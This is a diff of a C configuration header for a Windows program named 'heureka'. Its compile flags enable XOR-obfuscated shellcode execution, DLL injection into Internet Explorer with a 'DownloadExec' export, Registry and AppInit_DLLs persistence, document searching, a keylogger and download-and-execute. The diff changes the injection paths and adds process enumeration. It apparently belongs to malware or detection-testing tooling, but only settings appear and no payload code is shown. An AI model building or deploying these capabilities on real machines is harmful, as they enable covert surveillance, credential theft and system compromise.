@@ -1,11 +1,13 @@
 // compilation setup
-#define SHELLCODE 1				// The binary will contain shellcode
+#define SHELLCODE 				// The binary will contain shellcode
 #define SHELLCODE_XOR 1			// The binary will contain XOR obfuscated shellcode
 #define ALLOC_RWX_CALL 1		// Task: Allocate memory, write and execute SHELLCODE 
 #define ALLOC_RWX_XOR_CALL 1	// Task: Allocate memory, write and execute XOR obfustcated SHELLCODE 
 #define WRITE_LOG 1				// Task: Write system information to temporary directory
-#define DLL_INJECT_IE 1			// Task: Inject DLL (HEUREKADLL_PATH) into an Internet Explorer(IE_PATH) process
-#define DLL_INJECT_IE_CALL "DownloadExec" // Task config: DLL export to call from DLL_INJECT_IE
+#define DLL_INJECT_EXE_PATH "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+#define DLL_INJECT_DLL_PATH "C:\\transfer\\x\\heurekadll.dll"
+#define DLL_INJECT_CALL "DownloadExec" // Task config: DLL export to call from DLL_INJECT_IE
+#define DLL_INJECT_ENUM_PROC "iexplore" // Enumerate processes and inject DLL into the first one matching this string
 #define SET_STARTUP_REGISTRY 1  // Task: Register heureka as a startup application in the Registry
 #define DLL_INJECT_REGISTRY 1	// Task: Set up AppInitDLL registry entry
 #define SEARCH_DOCS 1			// Task: Search for documents
@@ -13,8 +15,6 @@
 #define HOOK_KEYBOARD 1     // Task: Keylogger
 #define WRITE_HOSTS 0     // Task: Append hosts file
 #define DOWNLOAD_EXEC 1     // Task: Download and execute
-#define IE_PATH "C:\\Program Files\\Internet Explorer\\iexplore.exe"
-#define HEUREKADLL_PATH "Z:\\heureka\\heureka\\Release\\heurekadll.dll"
 
 #define MAX_STATUS 1024
 
